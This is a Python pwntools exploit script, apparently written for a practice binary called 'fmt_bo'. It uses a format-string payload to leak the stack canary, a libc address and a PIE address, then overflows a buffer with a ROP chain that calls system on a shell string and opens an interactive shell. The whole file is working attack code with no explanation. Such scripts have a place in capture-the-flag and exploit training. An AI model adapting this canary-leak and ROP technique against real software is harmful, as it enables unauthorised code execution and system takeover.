#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64")

bin = context.binary = ELF("./fmt_bo")

bin_rop = ROP("./fmt_bo")

libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_rop = ROP("/lib/x86_64-linux-gnu/libc.so.6")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
b main
continue
""".format(
    **locals()
)

io = start()

payload = f"%23$p.%25$p.%27$p".encode()

io.sendline(payload)

leak = io.recvline(keepends=False)

addresses = leak.split(b" - ")[1]


canary = int(addresses.split(b".")[0], 16)
libc = int(addresses.split(b".")[1], 16)
pie = int(addresses.split(b".")[2], 16)


pop_rdi = bin_rop.find_gadget(["pop rdi", "ret"])[0]
ret = bin_rop.find_gadget(["ret"])[0]
system = libc_elf.sym.system


pie_base = pie - 0x11A9
libc_base = libc - 0x2724A
shell = libc_base + 0x196031

junk = b"a" * 136

payload = (
    junk
    + pack(canary)
    + pack(0)
    + pack(pie_base + pop_rdi)
    + pack(shell)
    + pack(pie_base + ret)
    + pack(libc_base + system)
)

io.sendline(payload)

io.interactive()
